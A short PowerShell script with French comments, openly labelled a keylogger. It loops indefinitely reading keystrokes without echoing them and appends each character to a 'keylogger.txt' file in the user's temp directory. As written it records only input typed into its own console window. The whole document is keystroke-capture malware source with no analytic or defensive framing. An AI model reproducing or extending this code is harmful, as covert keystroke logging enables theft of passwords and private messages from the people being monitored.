# Obtenir le chemin du répertoire temporaire de l'utilisateur
$tempDir = [System.IO.Path]::GetTempPath()

# Créer le chemin d'accès complet du fichier de log dans le répertoire temporaire
$logfile = Join-Path -Path $tempDir -ChildPath "keylogger.txt"

# Fonction pour détecter les frappes du clavier
function Get-KeyPress {
    $key = $host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
    return $key.Character
}

# Boucle infinie pour surveiller les frappes
while ($true) {
    $key = Get-KeyPress
    if ($key -ne "`0") { 
        Add-Content -Path $logfile -Value $key
    }
}
